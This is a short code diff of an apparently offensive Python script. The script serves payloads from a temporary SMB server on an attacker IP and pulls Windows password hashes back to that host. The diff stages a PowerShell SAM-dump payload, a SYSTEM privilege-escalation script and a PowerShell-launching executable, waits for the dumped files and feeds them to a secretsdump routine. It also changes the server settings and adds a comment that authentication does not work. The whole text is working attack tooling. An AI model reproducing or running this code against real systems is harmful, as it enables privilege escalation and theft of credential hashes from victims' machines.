@@ -8,16 +8,18 @@ from stolen_from_impacket.secretsdump import dump
 
 local_ip = "10.10.16.101"
 
-with TempSMB(local_ip=local_ip) as smb:
+with TempSMB(local_ip=local_ip, set_credentials=False, smb2=True) as smb:
+    """currently doesnt work with authentication... I really need to refactor this shit...."""
+
     sam_dump_payload = SamDumpPowershell(smb)
     get_system_powershell_script = provide_get_system(sam_dump_payload.file.remote_path)
     get_system_powershell_file = smb.create_temp_file(get_system_powershell_script, ext=".ps1")
     get_system_exe = CRunPowershellExe(smb, [get_system_powershell_file])
 
-
     print(f"{"="*10}ANGRY SMB READY{"="*10}")
     print(get_system_exe.file.remote_path)
     print(f"{"="*10}waiting{"="*10}")
+
 
     sam_dump_payload.await_output_files()
     try:
